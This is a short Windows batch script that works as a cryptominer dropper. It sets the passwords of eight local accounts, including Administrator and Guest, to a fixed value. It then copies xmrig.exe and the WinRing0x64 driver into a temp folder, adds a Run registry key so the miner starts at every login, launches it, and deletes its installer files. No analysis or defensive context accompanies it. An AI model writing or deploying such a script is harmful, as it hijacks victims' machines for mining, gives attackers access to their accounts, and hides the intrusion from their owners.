@echo off
net user admin   xroot11
net user cloudbase-init xroot11
net user WDAGUtilityAccount xroot11
net user Administrator  xroot11
net user Guest  xroot11
net user DefaultAccount xroot11
net user DefaultAdmin xroot11
net user LocalAdmin xroot11


mkdir %temp%\tar
reg ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "test" /t REG_SZ /d "%temp%\tar\start.bat" /f
copy start.bat %temp%\tar
copy WinRing0x64.sys %temp%\tar
copy xmrig.exe %temp%\tar
start %temp%\tar\start.bat
del /q setup.reg
del /q start.bat
del /q WinRing0x64.sys
del /q xmrig.exe
del /q script.bat
